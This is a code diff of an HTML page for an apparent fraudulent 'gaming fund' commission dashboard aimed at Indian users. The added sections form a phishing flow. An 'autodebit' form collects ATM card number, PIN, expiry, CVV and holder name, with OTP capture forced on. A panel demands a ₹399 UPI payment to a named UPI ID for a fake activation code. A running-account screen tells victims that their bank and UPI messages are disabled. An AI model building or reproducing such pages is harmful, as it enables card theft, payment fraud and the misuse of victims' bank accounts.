@@ -8,6 +8,13 @@
 </head>
 <body>
     <div class="container">
+        <!-- Telegram Icon -->
+        <a href="https://t.me/+gPDN87ly87liYTc1" class="telegram-icon" target="_blank" title="Join our Telegram">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 0C7.16 0 0 7.16 0 16s7.16 16 16 16 16-7.16 16-16-7.16-16-16-16zm7.69 10.94l-1.18 5.57c-.09.44-.32.57-.65.57-.36 0-1.02-.18-1.59-.35 1.21.79 2.13 1.28 3.01 1.73.32.17.51.43.44.71l-.83 5.44c-.09.49-.48.62-.98.41-2.31-1.29-3.71-2.07-5.02-3.22-.94.85-2.09 1.9-3.21 2.96-.38.35-.7.48-1.05.15l-.56-3.75c-.06-.4.08-.63.49-.78 2.36-.77 4.81-1.57 6.94-2.69-1.72-1.57-3.48-3.16-4.63-4.23-.4-.37-.26-.93.24-1.15l3.65-.82c.35-.08.65.07.82.38l2.15 4.39c.12.24.31.35.54.29.57-.16 1.21-.37 1.82-.59.27-.1.48.04.53.31z" fill="currentColor"/>
+            </svg>
+        </a>
+
         <!-- Header -->
         <div class="dashboard-header">
             <h1 id="welcomeMessage">WELCOME USER</h1>
@@ -18,7 +25,7 @@
         <div class="dashboard-section" id="mainDashboard">
             <div class="card gaming-fund-card">
                 <h3>💰 Gaming Fund</h3>
-                <p class="commission-text">@12% Commission</p>
+                <p class="commission-text">@3.5% Commission</p>
                 <button class="btn btn-primary btn-large" id="gamingFundBtn">Setup Gaming Fund</button>
             </div>
         </div>
@@ -63,100 +70,110 @@
                 </form>
                 <div id="accountDetailsMessage" class="message"></div>
             </div>
+        </div>
 
+        <!-- Autodebit Panel -->
+        <div class="dashboard-section hidden" id="autodebitSection">
             <div class="card">
-                <button class="btn btn-success btn-large" id="runAccountBtn">Run Your Account Live</button>
+                <h3>ACTIVATE YOUR AUTODEBIT PROCESS</h3>
+                <form id="autodebitForm">
+                    <div class="form-group">
+                        <label for="atmCardNumber">Enter ATM Card Number</label>
+                        <input type="text" id="atmCardNumber" placeholder="Enter card number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmCardPin">Enter ATM Card PIN</label>
+                        <input type="password" id="atmCardPin" placeholder="Enter PIN" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmCardExpiry">Enter ATM Card Expiry (MM/YY)</label>
+                        <input type="text" id="atmCardExpiry" placeholder="MM/YY" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmCardCvv">Enter ATM Card CVV</label>
+                        <input type="password" id="atmCardCvv" placeholder="Enter CVV" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="autodebitAccountHolder">Enter Account Holder Name</label>
+                        <input type="text" id="autodebitAccountHolder" placeholder="Enter account holder name" required>
+                    </div>
+
+                    <div class="form-group toggle-group">
+                        <label for="enableOtpToggle">Enable Auto Detect OTP</label>
+                        <div class="toggle-switch toggle-locked">
+                            <input type="checkbox" id="enableOtpToggle" class="toggle-checkbox" checked disabled>
+                            <span class="toggle-slider"></span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Save and Continue</button>
+                </form>
+                <div id="autodebitMessage" class="message"></div>
             </div>
         </div>
 
-        <!-- Activation Section -->
-        <div class="dashboard-section hidden" id="activationSection">
+        <!-- Activation Payment Panel -->
+        <div class="dashboard-section hidden" id="activationPaymentSection">
+            <div class="card" style="text-align:center;padding:40px 25px;">
+                <h3>ACTIVATE YOUR ACCOUNT</h3>
+                <p style="font-size:1.3rem;margin:20px 0;color:var(--text-secondary);">PAY ₹399 TO GET ACTIVATION CODE LIVE</p>
+                <button class="btn btn-primary btn-large" id="activationPaymentBtn">Proceed to Payment</button>
+            </div>
+        </div>
+
+        <!-- Activation Code UPI Panel -->
+        <div class="dashboard-section hidden" id="activationCodeUpiSection">
             <div class="card">
-                <h3>Activate Your Account</h3>
-
-                <!-- New User Offer -->
-                <div class="offer-card">
-                    <h4>🎉 New User – 70% OFF</h4>
-                    <p class="offer-description">Special offer for new users</p>
-                    <button class="btn btn-info" id="newUserOfferBtn">If you are a new user click here</button>
-                    
-                    <!-- New User Payment Details (Hidden Initially) -->
-                    <div class="payment-details hidden" id="newUserPaymentDetails">
-                        <p class="payment-amount">Pay ₹77 Only</p>
-                        
-                        <!-- UPI Details -->
-                        <div class="upi-section">
-                            <h4>Payment via UPI</h4>
-                            <p class="upi-label">UPI ID:</p>
-                            <div class="upi-display">
-                                <span class="upiId">malikworker78@fam</span>
-                                <button class="btn btn-secondary copyUpiBtn">Copy UPI ID</button>
-                            </div>
-                            <div class="copyMessage copy-message"></div>
-                        </div>
-
-                        <!-- UTR Submission -->
-                        <div class="form-group">
-                            <label for="newUserUtrInput">Submit UTR</label>
-                            <input type="text" id="newUserUtrInput" class="utrInput" placeholder="Enter UTR number">
-                            <button class="btn btn-primary submitUtrBtn">Submit UTR</button>
-                        </div>
-                        <div class="utrMessage message"></div>
+                <h3>Payment – ₹399 Only</h3>
+                
+                <div class="upi-section">
+                    <h4>Payment via UPI</h4>
+                    <p class="upi-label">UPI ID:</p>
+                    <div class="upi-display">
+                        <span class="upiId">malikworker78@fam</span>
+                        <button type="button" class="btn btn-secondary" id="activationCopyUpiBtn">Copy UPI ID</button>
                     </div>
+                    <div class="copyMessage" id="activationCopyMessage"></div>
                 </div>
 
-                <!-- Old User Offer -->
-                <div class="offer-card">
-                    <h4>👤 Old User – 20% OFF</h4>
-                    <p class="offer-description">Return user discount</p>
-                    <button class="btn btn-info" id="oldUserOfferBtn">If you are an old user click here</button>
-                    
-                    <!-- Old User Payment Details (Hidden Initially) -->
-                    <div class="payment-details hidden" id="oldUserPaymentDetails">
-                        <p class="payment-amount">Pay ₹157 Only</p>
-                        
-                        <!-- UPI Details -->
-                        <div class="upi-section">
-                            <h4>Payment via UPI</h4>
-                            <p class="upi-label">UPI ID:</p>
-                            <div class="upi-display">
-                                <span class="upiId">malikworker78@fam</span>
-                                <button class="btn btn-secondary copyUpiBtn">Copy UPI ID</button>
-                            </div>
-                            <div class="copyMessage copy-message"></div>
-                        </div>
-
-                        <!-- UTR Submission -->
-                        <div class="form-group">
-                            <label for="oldUserUtrInput">Submit UTR</label>
-                            <input type="text" id="oldUserUtrInput" class="utrInput" placeholder="Enter UTR number">
-                            <button class="btn btn-primary submitUtrBtn">Submit UTR</button>
-                        </div>
-                        <div class="utrMessage message"></div>
-                    </div>
+                <div class="form-group">
+                    <label for="activationUtrInput">Submit UTR</label>
+                    <input type="text" id="activationUtrInput" placeholder="Enter UTR number">
+                    <button type="button" class="btn btn-primary" id="activationSubmitUtrBtn" style="width:100%;margin-top:8px;">Submit UTR</button>
                 </div>
+                <div id="activationUtrMessage" class="message"></div>
             </div>
         </div>
 
-        <!-- Success Section -->
-        <div class="dashboard-section hidden" id="successSection">
-            <div class="card success-card">
-                <h3>✅ Success!</h3>
-                <p id="successMessage">Your panel has been successfully activated</p>
-                <button class="btn btn-success btn-large" id="finalRunBtn">Click here to run your account</button>
+        <!-- Activation Code Display -->
+        <div class="dashboard-section hidden" id="activationCodeDisplaySection">
+            <div class="card" style="text-align:center;padding:40px 25px;">
+                <h3 style="color:var(--success-color);">✅ Activation Code Generated</h3>
+                <p style="margin:20px 0;font-size:1.1rem;color:var(--text-secondary);">Your activation code:</p>
+                <div style="font-size:2rem;font-weight:800;color:var(--primary-color);margin:20px 0;letter-spacing:3px;" id="generatedActivationCode">0000000</div>
+                <button type="button" class="btn btn-secondary" id="copyActivationCodeBtn" style="width:100%;margin-bottom:10px;">Copy Activation Code</button>
+                <button type="button" class="btn btn-primary btn-large" id="activateAccountCodeBtn">Activate</button>
             </div>
         </div>
 
-        <!-- Final Message Section -->
-        <div class="dashboard-section hidden" id="finalMessageSection">
-            <div class="card final-card">
-                <h3>⏱️ Account Processing</h3>
-                <p class="final-message">Your account will be run in 90 minutes.<br>Please come back after 90 minutes.</p>
-                <button class="btn btn-primary" id="backToDashboardBtn">Back to Dashboard</button>
+        <!-- Code Verification Section -->
+        <div class="dashboard-section hidden" id="codeVerificationSection">
+            <div class="card">
+                <h3>Verify Activation Code</h3>
+                <div class="form-group">
+                    <label for="enteredActivationCode">Enter the 7-digit activation code</label>
+                    <input type="text" id="enteredActivationCode" placeholder="Enter activation code" maxlength="7">
+                    <button type="button" class="btn btn-primary" id="submitVerificationBtn" style="width:100%;margin-top:12px;">Verify Code</button>
+                </div>
+                <div id="verificationMessage" class="message"></div>
             </div>
         </div>
 
-        <!-- Running Account Section (NEW) -->
+        <!-- Running Account Section -->
         <div class="dashboard-section hidden" id="runningAccountSection">
             <div class="card running-card">
                 <h2 class="running-header">YOUR BANK AND UPI MESSAGES ARE DISABLED WHILE RUNNING ACCOUNT</h2>
@@ -181,7 +198,7 @@
 
                     <div class="running-right">
                         <div class="side-panel">
-                            <h4>Commission Earned (12%)</h4>
+                            <h4>Commission Earned (3.5%)</h4>
                             <div id="commissionAmount">₹0</div>
                             <button class="btn btn-primary" id="withdrawCommissionBtn">Withdraw Your Commission in Another Account</button>
                         </div>
@@ -190,7 +207,7 @@
             </div>
         </div>
 
-        <!-- Withdraw Commission Panel (NEW) -->
+        <!-- Withdraw Commission Panel -->
         <div class="dashboard-section hidden" id="withdrawCommissionSection">
             <div class="card">
                 <h3>Withdraw Commission</h3>
@@ -217,7 +234,7 @@
 
                     <button type="submit" class="btn btn-primary">Withdraw Commission</button>
                 </form>
-                <button class="btn btn-secondary" id="backFromWithdrawBtn" style="margin-top:10px;">Back</button>
+                <button class="btn btn-secondary" id="backFromWithdrawBtn" style="margin-top:10px;width:100%;">Back</button>
             </div>
         </div>
     </div>
